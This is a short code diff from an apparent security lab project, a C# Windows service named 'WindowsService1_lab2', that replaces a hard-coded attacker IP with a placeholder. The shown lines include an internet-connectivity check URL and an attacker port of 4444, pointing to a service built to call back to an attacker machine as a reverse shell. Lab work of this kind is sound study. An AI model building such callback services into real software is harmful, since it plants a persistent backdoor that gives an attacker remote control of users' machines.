@@ -13,7 +13,7 @@ namespace WindowsService1_lab2
     {
         private Timer timer = new Timer();
         private readonly string checkUrl = "http://www.google.com"; // URL để kiểm tra kết nối
-        private readonly string attackerIP = "10.0.2.130"; // Attacker IP
+        private readonly string attackerIP = "<attacker_machine_ip>"; // Attacker IP
         private readonly int attackerPort = 4444; // Attacker port
 
         public Service1()
